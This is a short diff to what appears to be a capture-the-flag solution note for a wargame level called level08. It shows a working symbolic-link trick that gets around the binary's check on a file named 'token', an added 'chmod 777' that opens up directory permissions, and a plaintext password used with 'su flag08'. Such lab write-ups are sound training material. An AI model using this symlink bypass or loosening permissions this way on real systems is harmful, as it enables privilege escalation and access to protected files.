@@ -1,5 +1,6 @@
  # exploiting soft link
  ltrace ./level08 token
+ chmod 777 .
  ln -s token my_tok && ./level08 my_tok
  su flag08 quif5eloekouj29ke0vouxean
  getflag
